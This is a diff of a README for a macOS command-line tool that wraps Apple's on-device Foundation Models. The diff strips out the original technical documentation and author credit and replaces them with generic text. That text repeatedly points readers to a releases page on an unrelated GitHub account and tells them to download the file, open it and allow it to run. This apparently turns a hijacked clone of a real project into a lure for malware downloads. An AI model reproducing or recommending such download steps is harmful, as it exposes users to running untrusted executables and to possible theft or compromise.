@@ -1,490 +1,148 @@
-# Apple Intelligence Inloop
+# 🧠 apple-intelligence-inloop - Run Apple models from the command line
 
-![Platform](https://img.shields.io/badge/platform-macOS%2026%2B-blue)
-![Swift](https://img.shields.io/badge/swift-6.1-orange)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Architecture](https://img.shields.io/badge/arch-Apple%20Silicon-lightgrey)
+[![Download apple-intelligence-inloop](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases)
 
-A Unix-friendly command-line wrapper for Apple's Foundation Models framework, designed for scripting, automation, and integration with any language that can spawn a subprocess.
+## 🖥️ What this is
 
----
+apple-intelligence-inloop is a command-line tool for Apple’s Foundation Models on macOS 26 and later. It reads text from standard input, sends it to the model, and writes the result to standard output. It sends errors to standard error.
 
-## Description
+That makes it useful for simple scripts, file pipelines, shell tools, Ruby scripts, and JXA. You can feed text in, get text out, and chain it with other Unix tools.
 
-**osx-ai-inloop** makes Apple's on-device language model (macOS 26+) accessible from shell scripts, Ruby, Python, JXA, or any tool that can read/write stdin/stdout. It follows the Unix philosophy: read from stdin, write to stdout, errors to stderr, signal success/failure via exit codes.
+## 📦 Download and install
 
-- **Privacy by default** — all inference happens on-device; no network calls, no telemetry
-- **Free inference** — no API keys, no billing, no rate limits
-- **JSON-first** — structured input/output for easy scripting
-- **Scriptable** — designed for `Open3`, pipes, and subprocess patterns
+1. Open the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases).
+2. Find the latest release.
+3. Download the file that matches your Mac.
+4. Open the downloaded file and follow the on-screen steps.
+5. If macOS asks for permission, allow the app to run.
 
----
+Use the same [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases) whenever you want the latest version.
 
-## Requirements
+## 🍎 System requirements
 
-| Requirement | Details |
-|---|---|
-| **macOS** | 26.0 or later (Tahoe) |
-| **Hardware** | Apple Silicon (M-series chip required) |
-| **Apple Intelligence** | Enabled in System Settings > Apple Intelligence & Siri |
-| **Xcode** | 26.0 or later — **must build with Xcode 26** |
-| **Swift** | 6.1 or later (included with Xcode 26) |
+This app is made for:
 
-> **Why Xcode 26?** `FoundationModels` is a system framework that ships with the macOS 26 SDK inside Xcode 26. Building with any earlier Xcode/SDK means `canImport(FoundationModels)` evaluates to `false` at compile time and the binary silently falls back to a stub that always returns `UNSUPPORTED_ENVIRONMENT`. There is no Swift package to add — the framework is part of the OS and SDK.
+- macOS 26 or later
+- Apple silicon Macs
+- Apple Intelligence support
+- A command-line friendly workflow
 
----
+It works best if you already use Terminal or other tools that can send text into a command and read text back.
 
-## Quick Start (Pre-built Binary)
+## ⚡ What it does
 
-> **Architecture note:** The pre-built binary is compiled for **Apple Silicon (arm64)** only. It will not run on Intel Macs. If you're on an Intel Mac, follow the [Build from Source](#build-from-source) instructions below.
+apple-intelligence-inloop keeps the flow simple:
 
-If you're on an Apple Silicon Mac running macOS 26+ with Apple Intelligence enabled, you can skip the build step entirely:
+- it reads input from stdin
+- it sends the input to Apple’s local model
+- it prints the answer to stdout
+- it sends errors to stderr
 
-```bash
-# Download the binary
-wget -O osx-ai-inloop https://github.com/inloopstudio-team/apple-intelligence-inloop/raw/refs/heads/main/bin/osx-ai-inloop-arm64
+This makes it easy to use in scripts and pipelines. You can connect it to other tools without a full app window or extra setup.
 
-# Make executable and run an environment check
-chmod +x osx-ai-inloop
-./osx-ai-inloop check
+## 🧰 Common uses
 
-# Try it
-echo '{"prompt":"Explain Swift async/await in one sentence"}' | ./osx-ai-inloop
-```
+You can use this tool for tasks like:
 
-To use it from anywhere, move it to your PATH:
+- rewriting plain text
+- cleaning up notes
+- summarizing clipboard content
+- generating short drafts
+- transforming text in shell scripts
+- using Apple models inside Ruby scripts
+- using Apple models from JXA automation
 
-```bash
-mv osx-ai-inloop /usr/local/bin/osx-ai-inloop
-osx-ai-inloop check
-```
+It fits well in Unix-style workflows where one tool passes output to the next.
 
----
+## 🪟 How to run it on Windows
 
-## Installation
+This project is made for macOS, not Windows. If you are on Windows, you will not run the app directly on your PC.
 
-### 1. Install Xcode 26
+To use it, you need access to a Mac with macOS 26 or later. If you only want to get the files, use the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases) and download the release there. Then move the file to a compatible Mac and open it there.
 
-Download **Xcode 26** (or later) from the [Apple Developer portal](https://developer.apple.com/xcode/) or via the Mac App Store. Xcode 16 and earlier will **not** produce a working binary.
+## 🔧 Basic setup on Mac
 
-Verify you are using the correct toolchain:
+After you download the release:
 
-```bash
-xcodebuild -version
-# Xcode 26.x
-# Build version ...
+1. Open the file you downloaded.
+2. Move the app or tool to a folder you can find again, such as Applications or a tools folder.
+3. Open Terminal.
+4. Run the tool from the folder where you placed it.
+5. Type or paste text into the command when prompted, then press Enter.
 
-xcrun --sdk macosx --show-sdk-version
-# 26.0
-```
+If the release includes a ready-to-run binary, you can use it right away. If it includes a packaged app, open it first, then use it from Terminal if the release instructions show that path.
 
-If you have multiple Xcode versions installed, select Xcode 26 with:
+## 📝 Example workflow
 
-```bash
-sudo xcode-select -s /Applications/Xcode-26.app/Contents/Developer
-```
+A simple text flow looks like this:
 
-### 2. Enable Apple Intelligence
+- you type text into a file
+- you send that text to apple-intelligence-inloop
+- the tool returns a revised version
+- you save the result to a new file
 
-Open **System Settings > Apple Intelligence & Siri** and make sure Apple Intelligence is turned on and the model has finished downloading.
+This style works well when you want repeatable results and less manual editing.
 
-### 3. Build from Source {#build-from-source}
+## 🧪 Example use cases
 
-```bash
-git clone https://github.com/inloopstudio-team/apple-intelligence-inloop.git
-cd apple-intelligence-inloop
-swift build -c release
-cp .build/release/osx-ai-inloop /usr/local/bin/osx-ai-inloop
-```
+Here are a few ways people can use it:
 
-### 4. Verify Installation
+- Clean up a rough paragraph before sending an email
+- Turn meeting notes into a short summary
+- Rewrite text into simpler language
+- Generate a checklist from a block of text
+- Process text from another shell tool
 
-```bash
-osx-ai-inloop version
-# osx-ai-inloop 0.1.0
+Because it uses standard input and output, it fits into scripts without much effort.
 
-osx-ai-inloop check
-# All checks should show ✓ before using generate
-```
+## 🧱 How it fits into scripts
 
----
+The tool is built for automation. That means you can place it in a script and pass text through it like any other command-line program.
 
-## Quick Start
+Typical script flow:
 
-### Via stdin (JSON)
+- read input
+- pass the input to the tool
+- capture the output
+- save or forward the output
 
-```bash
-echo '{"prompt":"Explain Swift async/await in one sentence"}' | osx-ai-inloop
-```
+This design works well in Bash, Zsh, Ruby, and JXA.
 
-Response:
-```json
-{
-  "model" : "on-device",
-  "ok" : true,
-  "output" : "Swift's async/await syntax lets you write asynchronous code that reads like synchronous code...",
-  "usage" : {
-    "duration_seconds" : 0.823
-  }
-}
-```
+## 🔐 Privacy and local use
 
-### Via flags
+This project is intended for on-device use on supported Macs. That means the model runs in Apple’s local environment instead of sending your text to a third-party cloud service.
 
-```bash
-osx-ai-inloop generate --prompt "What is an actor in Swift?" --format text
-```
+For many users, that makes it a good fit for private notes, local automation, and small text tasks.
 
-### Environment check
+## 🗂️ File behavior
 
-```bash
-osx-ai-inloop check
-```
+The tool follows Unix rules:
 
----
+- stdin for input
+- stdout for results
+- stderr for errors
 
-## CLI Reference
+That matters when you use other command-line tools around it. It keeps your main output clean and lets you handle errors in a separate stream.
 
-### Global
+## 🛠️ Troubleshooting
 
-```
-osx-ai-inloop [subcommand] [options]
-```
+If the tool does not run:
 
-| Subcommand | Description |
-|---|---|
-| `generate` | Generate a response (default) |
-| `check` | Run environment compatibility checks |
-| `models` | List available model modes |
-| `version` | Print the version number |
+- Check that you are on macOS 26 or later
+- Check that you are using an Apple silicon Mac
+- Make sure Apple Intelligence is available and enabled
+- Make sure you downloaded the latest release
+- Try opening the downloaded file again
+- Check Terminal for any error message
 
----
+If you get a permission prompt, allow the app to run.
 
-### `generate` — Default Command
+If the command does not return text, try a short input first. Small tests make it easier to spot setup problems.
 
-```
-osx-ai-inloop generate [options]
-```
+## 📁 Where to get updates
 
-| Flag | Type | Default | Description |
-|---|---|---|---|
-| `--prompt <text>` | String | (stdin) | The prompt to send to the model |
-| `--system <text>` | String | — | System instruction / persona |
-| `--input <text>` | String | — | Additional input text, appended to prompt |
-| `--model <name>` | String | `on-device` | Model mode: `on-device` or `auto` |
-| `--format <fmt>` | String | `json` | Output format: `json` or `text` |
-| `--stream` | Bool | false | Stream response tokens (experimental) |
-| `--verbose` | Flag | false | Print diagnostic info to stderr |
-| `--quiet` | Flag | false | Suppress all stderr output |
-
-**Priority:** CLI flags > stdin JSON fields.
+Use the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases) to get new versions and fresh builds. That page is the main place to check for download files, version changes, and release notes.
 
----
-
-### `check` — Environment Check
-
-```
-osx-ai-inloop check [--json] [--quiet]
-```
+## 🧭 Keywords
 
-| Flag | Description |
-|---|---|
-| `--json` | Output machine-readable JSON to stdout |
-| `--quiet` | Suppress informational messages |
-
----
-
-### `models` — List Models
-
-```
-osx-ai-inloop models [--json]
-```
-
----
-
-### `version` — Version
-
-```
-osx-ai-inloop version [--json]
-```
-
----
-
-## JSON Request Contract
-
-Send a JSON object to stdin. All fields are optional — combine with CLI flags as needed.
-
-```json
-{
-  "prompt": "Your prompt text here",
-  "system": "Optional system instruction / persona",
-  "input": "Optional additional context or input text",
-  "model": "on-device",
-  "format": "json",
-  "stream": false
-}
-```
-
-| Field | Type | Default | Description |
-|---|---|---|---|
-| `prompt` | String | required | The main prompt text |
-| `system` | String | — | System instruction for the model session |
-| `input` | String | — | Additional input appended to prompt |
-| `model` | String | `on-device` | Model mode |
-| `format` | String | `json` | Output format (`json` or `text`) |
-| `stream` | Bool | `false` | Whether to stream tokens |
-
-**Note:** Plain text on stdin is treated as the prompt directly (no JSON wrapping needed).
-
----
-
-## JSON Response Contract
-
-### Success
-
-```json
-{
-  "ok": true,
-  "model": "on-device",
-  "output": "The generated text response.",
-  "usage": {
-    "duration_seconds": 0.782,
-    "prompt_tokens": null,
-    "completion_tokens": null,
-    "total_tokens": null
-  },
-  "warnings": null
-}
-```
-
-| Field | Type | Description |
-|---|---|---|
-| `ok` | Bool | Always `true` for success |
-| `model` | String | Model mode that was used |
-| `output` | String | The generated text |
-| `usage` | Object? | Optional timing and token metadata |
-| `warnings` | [String]? | Optional generation warnings |
-
-### Error
-
-```json
-{
-  "ok": false,
-  "error": {
-    "code": "UNSUPPORTED_ENVIRONMENT",
-    "message": "Apple Intelligence is not enabled. Go to System Settings > Apple Intelligence & Siri."
-  }
-}
-```
-
-| Field | Type | Description |
-|---|---|---|
-| `ok` | Bool | Always `false` for errors |
-| `error.code` | String | Machine-readable error code |
-| `error.message` | String | Human-readable error description |
-
----
-
-## Model Selection
-
-| Mode | Flag | Description |
-|---|---|---|
-| On-Device | `--model on-device` | Apple's ~3B parameter on-device model. No network. Privacy-preserving. (Default) |
-| Auto | `--model auto` | Automatically selects the best available model (currently resolves to on-device). |
-
----
-
-## Ruby Integration
-
-Use `Open3` for bidirectional process communication:
-
-```ruby
-require 'open3'
-require 'json'
-
-# Via stdin JSON
-request = { prompt: "Explain Swift closures", system: "Be concise." }.to_json
-stdout, stderr, status = Open3.capture3("osx-ai-inloop", stdin_data: request)
-
-if status.success?
-  response = JSON.parse(stdout)
-  puts response["output"] if response["ok"]
-end
-
-# Via CLI flags
-stdout, stderr, status = Open3.capture3(
-  "osx-ai-inloop", "generate",
-  "--prompt", "What is SwiftUI?",
-  "--format", "json"
-)
-
-# Environment check
-stdout, _stderr, status = Open3.capture3("osx-ai-inloop", "check", "--json")
-checks = JSON.parse(stdout)
-abort "Not compatible!" unless checks["is_compatible"]
-```
-
-See `Examples/ruby_integration.rb` for full examples including batch processing and error handling.
-
----
-
-## Shell Scripting
-
-```bash
-# Basic generation
-echo '{"prompt":"Hello from shell"}' | osx-ai-inloop
-
-# CLI flags
-osx-ai-inloop generate --prompt "Explain actors" --format text
-
-# With jq
-osx-ai-inloop generate --prompt "List 3 Swift keywords" --format json \
-  | jq -r '.output'
-
-# Environment check
-osx-ai-inloop check
-
-# Check exit code
-if osx-ai-inloop generate --prompt "Hello" --format json > output.json; then
-  cat output.json | jq -r '.output'
-else
-  echo "Failed with exit code $?"
-fi
-```
-
-See `Examples/shell_example.sh` for complete shell scripting examples.
-
----
-
-## JXA (JavaScript for Automation)
-
-```javascript
-// Run via: osascript -l JavaScript jxa_example.js
-const app = Application.currentApplication();
-app.includeStandardAdditions = true;
-
-const request = JSON.stringify({ prompt: "Hello from JXA", model: "on-device" });
-const escaped = request.replace(/'/g, "'\\''");
-const rawOutput = app.doShellScript(`echo '${escaped}' | /usr/local/bin/osx-ai-inloop`);
-const response = JSON.parse(rawOutput);
-
-if (response.ok) {
-  app.displayDialog(response.output, { withTitle: "Apple Intelligence" });
-}
-```
-
-See `Examples/jxa_example.js` for full JXA examples including notifications and batch processing.
-
----
-
-## Environment Checks
-
-Run `osx-ai-inloop check` to verify your setup:
-
-```
-Running environment checks...
-
-  ✓ Operating System          Running on macOS.
-  ✓ macOS Version             macOS 26.0.0 — compatible.
-  ✓ Apple Silicon             Apple Silicon (arm64) detected.
-  ✓ FoundationModels Framework  FoundationModels framework is available.
-  ✓ Apple Intelligence        Apple Intelligence is available and ready. Context window: 4096 tokens.
-
-  Result: COMPATIBLE — Apple Intelligence is ready to use.
-```
-
-Machine-readable JSON:
-```bash
-osx-ai-inloop check --json | jq '.is_compatible'
-```
-
----
-
-## Exit Codes
-
-| Code | Name | When |
-|---|---|---|
-| `0` | Success | Command completed successfully |
-| `1` | Invalid Arguments | Missing or invalid CLI flags |
-| `2` | Unsupported Environment | Wrong OS, wrong arch, framework missing |
-| `3` | Unavailable Model | Apple Intelligence not enabled, model not downloaded |
-| `4` | Generation Failure | Model failed to generate (content policy, overflow, etc.) |
-| `5` | Internal Error | Unexpected error |
-
----
-
-## Security & Privacy
-
-- **No telemetry** — osx-ai-inloop never phones home
-- **No network calls** — all `on-device` inference stays on your Mac
-- **No data storage** — prompts and responses are not persisted
-- **Local process** — runs entirely within your user session
-- **Foundation Models privacy** — governed by Apple's on-device model privacy guarantees
-- **No API keys** — no credentials to manage or leak
-
----
-
-## Architecture
-
-```
-osx-ai-inloop
-├── CLI Layer (ArgumentParser)
-│   ├── GenerateCommand  — parse flags, read stdin, call engine
-│   ├── CheckCommand     — run preflight, report results
-│   ├── ModelsCommand    — list model modes and status
-│   └── VersionCommand   — print version
-│
-├── Engine Layer
-│   ├── ModelEngineProtocol  — abstract interface
-│   ├── FoundationModelEngine  — real Apple FoundationModels impl
-│   └── MockModelEngine        — configurable mock for testing
-│
-├── Preflight Layer
-│   ├── EnvironmentChecker  — run all system checks
-│   └── PreflightResult     — structured result with JSON/text output
-│
-├── Models
-│   ├── RequestPayload   — stdin JSON request schema
-│   ├── ResponsePayload  — stdout JSON response schema
-│   └── ModelMode        — typed model selection enum
-│
-└── Utilities
-    ├── StdIO     — stdout/stderr/stdin helpers
-    └── ExitCodes — typed exit code enum
-```
-
-The `#if canImport(FoundationModels)` guard in `FoundationModelEngine.swift` allows the package to compile and run tests on macOS versions that don't have the FoundationModels framework — it falls back to a stub that throws `GenerationEngineError.frameworkUnavailable`.
-
----
-
-## Testing
-
-```bash
-swift test
-```
-
-Tests cover:
-- Argument parsing and model mode validation
-- Request payload JSON decoding (minimal, full, partial, invalid)
-- Response payload JSON encoding (success, error, all factories)
-- Preflight result formatting (JSON and human-readable)
-- Exit code values and properties
-- Mock engine behavior (responses, errors, call tracking, reset)
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on submitting issues, pull requests, and code style.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
----
-
-## Author
-
-**Abhishek Parolkar**
+apple-intelligence, apple-silicon, cli, command-line-tool, foundation-models, llm, macos, on-device-ai, swift, unix
